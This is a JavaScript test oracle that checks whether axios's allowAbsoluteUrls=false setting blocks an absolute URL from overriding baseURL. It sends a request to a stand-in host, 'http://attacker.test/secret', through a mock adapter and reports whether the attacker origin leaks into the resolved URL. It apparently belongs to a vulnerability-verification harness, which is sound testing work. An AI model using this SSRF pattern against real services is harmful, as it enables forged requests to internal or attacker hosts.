const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

(async () => {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';

  try {
    const marker = `axios-ssrf-oracle-${process.pid}-${Date.now()}`;
    const tmpDir = path.join(os.tmpdir(), marker);
    fs.mkdirSync(tmpDir, { recursive: true });

    const axiosMod = require('axios');
    const axios = axiosMod && axiosMod.default ? axiosMod.default : axiosMod;

    // Benign call proves normal relative URL flow works.
    let benignSeen = '';
    try {
      const benignResp = await axios.get('/ok', {
        baseURL: 'http://example.test/base/',
        adapter: async (config) => {
          benignSeen = String((config && config.url) || '');
          return {
            data: { ok: true },
            status: 200,
            statusText: 'OK',
            headers: {},
            config,
            request: { oracle: true }
          };
        }
      });

      if (!benignResp || benignResp.status !== 200) {
        throw new Error('benign_status_not_200');
      }
      if (!benignSeen) {
        throw new Error('benign_url_missing');
      }
      evidence += `benign_url=${benignSeen};`;
    } catch (e) {
      const msg = String((e && e.message) || e);
      console.log('ORACLE_RESULT ' + JSON.stringify({
        operation_completed: false,
        exploit_succeeded: false,
        evidence: `benign_failed:${msg.slice(0, 200)}`
      }));
      return;
    }

    operation_completed = true;

    // Malicious scenario: absolute URL should be rejected/neutralized when allowAbsoluteUrls=false.
    const inst = axios.create({
      baseURL: 'http://example.test/base/',
      allowAbsoluteUrls: false
    });

    let malSeen = '';
    let malAdapterCalled = false;

    try {
      await inst.get('http://attacker.test/secret?x=1', {
        adapter: async (config) => {
          malAdapterCalled = true;
          malSeen = String((config && config.url) || '');
          return {
            data: { ok: true },
            status: 200,
            statusText: 'OK',
            headers: {},
            config,
            request: { oracle: true }
          };
        }
      });
    } catch (e) {
      // Exception after benign success is treated as blocked for this oracle.
      const msg = String((e && e.message) || e);
      evidence += `malicious_error=${msg.slice(0, 180)};`;
      exploit_succeeded = false;
      console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
      return;
    }

    const lower = malSeen.toLowerCase();
    const leaksAbsolute = lower.includes('http://attacker.test') || lower.includes('https://attacker.test');

    // Vulnerable behavior: attacker absolute URL survives in resolved request URL.
    // Patched behavior: resolved URL is rooted at baseURL without attacker origin substring.
    exploit_succeeded = !!(malAdapterCalled && leaksAbsolute);
    evidence += `malicious_url=${malSeen};adapter_called=${malAdapterCalled};`;

    console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
  } catch (e) {
    const msg = String((e && e.message) || e);
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: `setup_or_runtime_error:${msg.slice(0, 200)}`
    }));
  }
})();